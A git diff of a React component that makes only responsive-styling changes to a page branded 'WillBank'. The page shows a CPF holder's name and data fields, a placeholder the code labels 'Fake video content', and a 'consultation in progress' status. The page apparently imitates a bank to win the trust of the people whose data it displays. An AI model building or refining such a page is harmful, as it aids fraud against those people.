@@ -50,65 +50,65 @@ const Video = () => {
   ];
 
   return (
-    <div className="min-h-screen bg-background flex flex-col">
+    <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
       <WillBankHeader userName={cpfData.nome.split(' ')[0].toUpperCase()} />
 
-      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
+      <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
         <WillBankCard className="w-full max-w-2xl">
-          <div className="space-y-6">
+          <div className="space-y-4 sm:space-y-6">
             {/* Progress bar at top */}
-            <Progress value={progress} className="h-2" />
+            <Progress value={progress} className="h-1.5 sm:h-2" />
 
             {/* Video Placeholder */}
-            <div className="relative aspect-video bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 rounded-2xl overflow-hidden shadow-xl">
+            <div className="relative aspect-video bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 rounded-xl sm:rounded-2xl overflow-hidden shadow-xl">
               {/* Fake video content */}
               <div className="absolute inset-0 flex items-center justify-center">
                 <div className="text-center">
-                  <div className="w-40 h-40 sm:w-48 sm:h-48 mx-auto bg-gradient-to-br from-primary to-amber-400 rounded-2xl flex items-center justify-center shadow-2xl">
-                    <span className="text-5xl sm:text-6xl">👩‍💼</span>
+                  <div className="w-28 h-28 sm:w-40 sm:h-40 mx-auto bg-gradient-to-br from-primary to-amber-400 rounded-2xl flex items-center justify-center shadow-2xl">
+                    <span className="text-4xl sm:text-5xl">👩‍💼</span>
                   </div>
                 </div>
               </div>
               
               {/* Audio Button Overlay */}
-              <button className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-primary text-primary-foreground px-8 py-4 rounded-full flex items-center gap-3 font-bold shadow-2xl hover:bg-primary/90 hover:scale-105 transition-all duration-300">
-                <Volume2 className="w-6 h-6" />
+              <button className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-primary text-primary-foreground px-5 py-3 sm:px-8 sm:py-4 rounded-full flex items-center gap-2 sm:gap-3 font-bold text-sm sm:text-base shadow-2xl hover:bg-primary/90 hover:scale-105 transition-all duration-300">
+                <Volume2 className="w-5 h-5 sm:w-6 sm:h-6" />
                 Clique para ouvir
               </button>
 
               {/* Video controls */}
-              <div className="absolute top-4 right-4 flex gap-2">
-                <button className="bg-black/60 backdrop-blur-sm text-white px-3 py-1.5 rounded-lg text-xs font-medium hover:bg-black/80 transition-colors">
-                  📋 Desanexar vídeo
+              <div className="absolute top-2 right-2 sm:top-4 sm:right-4 flex gap-1.5 sm:gap-2">
+                <button className="bg-black/60 backdrop-blur-sm text-white px-2 py-1 sm:px-3 sm:py-1.5 rounded-lg text-[10px] sm:text-xs font-medium hover:bg-black/80 transition-colors">
+                  📋 Desanexar
                 </button>
-                <button className="bg-black/60 backdrop-blur-sm text-white px-3 py-1.5 rounded-lg text-xs font-medium hover:bg-black/80 transition-colors">
+                <button className="bg-black/60 backdrop-blur-sm text-white px-2 py-1 sm:px-3 sm:py-1.5 rounded-lg text-[10px] sm:text-xs font-medium hover:bg-black/80 transition-colors">
                   ⏭️ RGX
                 </button>
               </div>
             </div>
 
             {/* User Data Card */}
-            <div className="border-2 border-primary/40 rounded-2xl overflow-hidden shadow-sm">
+            <div className="border-2 border-primary/40 rounded-xl sm:rounded-2xl overflow-hidden shadow-sm">
               {/* Yellow top border already from Card */}
               <div className="divide-y divide-border/40">
                 {dataFields.map((field, index) => {
                   const Icon = field.icon;
                   return (
-                    <div key={index} className="flex items-center gap-4 p-4 hover:bg-muted/30 transition-colors">
-                      <div className="w-11 h-11 bg-gradient-to-br from-primary/20 to-primary/10 rounded-xl flex items-center justify-center">
-                        <Icon className="w-5 h-5 text-primary" />
+                    <div key={index} className="flex items-center gap-3 p-3 sm:p-4 hover:bg-muted/30 transition-colors">
+                      <div className="w-9 h-9 sm:w-11 sm:h-11 bg-gradient-to-br from-primary/20 to-primary/10 rounded-lg sm:rounded-xl flex items-center justify-center">
+                        <Icon className="w-4 h-4 sm:w-5 sm:h-5 text-primary" />
                       </div>
-                      <span className="font-semibold text-foreground">{field.value}</span>
+                      <span className="font-semibold text-foreground text-sm sm:text-base">{field.value}</span>
                     </div>
                   );
                 })}
                 
                 {/* Consulta Status */}
-                <div className="flex items-center gap-4 p-4 bg-primary/5">
-                  <div className="w-11 h-11 bg-primary/20 rounded-xl flex items-center justify-center">
-                    <Search className={`w-5 h-5 text-primary ${!showConsulta ? 'animate-pulse' : ''}`} />
+                <div className="flex items-center gap-3 p-3 sm:p-4 bg-primary/5">
+                  <div className="w-9 h-9 sm:w-11 sm:h-11 bg-primary/20 rounded-lg sm:rounded-xl flex items-center justify-center">
+                    <Search className={`w-4 h-4 sm:w-5 sm:h-5 text-primary ${!showConsulta ? 'animate-pulse' : ''}`} />
                   </div>
-                  <span className={`font-medium ${showConsulta ? 'text-success' : 'text-muted-foreground'}`}>
+                  <span className={`font-medium text-sm sm:text-base ${showConsulta ? 'text-success' : 'text-muted-foreground'}`}>
                     {showConsulta ? "✓ Consulta finalizada!" : "Sua consulta está em andamento..."}
                   </span>
                 </div>
